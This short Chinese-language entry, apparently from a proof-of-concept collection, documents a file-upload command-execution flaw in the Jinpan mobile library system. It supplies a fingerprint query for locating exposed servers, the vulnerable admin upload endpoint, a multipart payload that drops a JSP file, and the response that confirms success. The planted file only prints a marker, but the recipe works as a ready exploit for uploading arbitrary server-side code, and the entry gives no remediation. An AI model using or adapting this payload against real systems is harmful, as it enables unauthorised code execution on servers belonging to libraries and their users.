# 金盘移动图书馆系统doUploadRCE漏洞

金盘移动图书馆系统doUpload ｜ 命令执行 ｜ —
- **指纹**：`app="金盘软件-金盘移动图书馆系统"`
- **请求**：`POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1`

**Payload**
```
------WebKitFormBoundary5iALAXlSiqxJXrhK
Content-Disposition: form-data; name="file";filename="dudesite.jsp"
<% out.println("dudesite"); %>
------WebKitFormBoundary5iALAXlSiqxJXrhK--
```
- **响应特征**：200 .jsp